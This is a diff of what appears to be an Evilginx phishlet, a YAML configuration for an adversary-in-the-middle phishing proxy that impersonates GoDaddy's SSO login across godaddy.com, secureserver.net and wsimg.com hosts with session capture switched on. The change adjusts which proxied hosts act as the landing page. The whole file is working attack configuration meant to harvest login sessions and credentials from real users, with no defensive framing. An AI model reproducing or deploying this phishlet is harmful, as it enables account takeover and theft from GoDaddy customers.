@@ -3,9 +3,9 @@ author: '@An0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: '', orig_sub: '', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
 #  - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: true, is_landing: false}
   - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: true, is_landing: false}
 #  - {phish_sub: 'events', orig_sub: 'events', domain: 'godaddy.com', session: true, is_landing: false}
